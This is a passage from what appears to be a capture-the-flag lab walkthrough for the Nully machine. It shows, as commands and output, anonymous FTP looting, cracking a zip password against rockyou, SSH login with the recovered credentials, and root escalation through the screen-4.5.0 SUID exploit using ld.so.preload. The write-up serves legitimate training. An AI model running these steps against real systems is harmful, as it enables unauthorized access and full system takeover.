OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.06 ms 172.17.0.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds
```

### FTP Access

Getting `.backup.zip` file from `ftp`
```
root@WebServer:~# ftp 172.17.0.3
Name (172.17.0.3:root): anonymous

ftp> ls
drwxr-xr-x    3 ftp      ftp          4096 Aug 27 08:35 pub

ftp> get file.txt
local: file.txt remote: file.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for file.txt (15 bytes).
226 Transfer complete.
15 bytes received in 0.00 secs (147.9640 kB/s)

ftp> get .backup.zip
local: .backup.zip remote: .backup.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .backup.zip (224 bytes).
226 Transfer complete.
224 bytes received in 0.00 secs (62.1625 kB/s)

ftp> quit
221 Goodbye.
```

Downloading `.backup.zip` file to host machine.
```
meterpreter > download /home/bob/.backup.zip
[*] Downloading: /home/bob/.backup.zip -> /home/burton/Downloads/nully/.backup.zip
[*] Downloaded 224.00 B of 224.00 B (100.0%): /home/bob/.backup.zip -> /home/burton/Downloads/nully/.backup.zip
[*] download   : /home/bob/.backup.zip -> /home/burton/Downloads/nully/.backup.zip
```

### Cracking ZIP Password

```
$ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' .backup.zip
PASSWORD FOUND!!!!: pw == 1234567890
```

The zip file contains `donald` user's credential
```
$ unzip .backup.zip 
Archive:  .backup.zip
[.backup.zip] creds.txt password: 1234567890
 extracting: creds.txt

$ cat creds.txt 
donald:HBRLoCZ0b9NEgh8vsECS
```

Credentials:
* User: **donald**
* Pass: **HBRLoCZ0b9NEgh8vsECS**

### SSH Access

Using `donald` user's credentials, we are able to login via SSH
```
root@MailServer:~/test# ssh donald@172.17.0.3
donald@172.17.0.3's password: HBRLoCZ0b9NEgh8vsECS

Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Aug 27 15:13:37 2020 from 172.17.0.1

donald@DatabaseServer:~$ id
uid=1000(donald) gid=1000(donald) groups=1000(donald)
```

### Privilege Escalation - Root

```
donald@DatabaseServer:~$ find / -type f -perm -u=s 2>/dev/null

/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/screen-4.5.0
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

donald@DatabaseServer:~$ ls -lah /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 1.8M Aug 27 09:50 /usr/bin/screen-4.5.0
```

The unusual SUID binary `/usr/bin/screen-4.5.0` has a privilege escalation exploit ( https://www.exploit-db.com/exploits/41154 )
```
donald@DatabaseServer:~$ ./screeroot.sh

~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
    7 |     chmod("/tmp/rootshell", 04755);
      |     ^~~~~
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
    7 |     execvp("/bin/sh", NULL, NULL);
      |     ^~~~~~
/tmp/rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-donald.

# python3 -c 'import pty;pty.spawn("/bin/bash")'

root@DatabaseServer:~# id
uid=0(root) gid=0(root) groups=0(root),1000(donald)
```

### Flag #3 - Database Server

```
root@DatabaseServer:~# cat /root/3_flag.txt 

    _  _   _____             _           _ _ 
  _| || |_|  __ \           | |         | | |
 |_  __  _| |__) |___   ___ | |_ ___  __| | |
  _| || |_|  _  // _ \ / _ \| __/ _ \/ _` | |
 |_  __  _| | \ \ (_) | (_) | ||  __/ (_| |_|
   |_||_| |_|  \_\___/ \___/ \__\___|\__,_(_)

   6cb25d4789cdd7fa1624e6356e0d825b                                            

Congratulations on getting the final flag! 
You completed the Nully Cybersecurity CTF.
I will be glad if you leave a feedback. 

Twitter https://twitter.com/laf3r_
Discord laf3r#4754
```
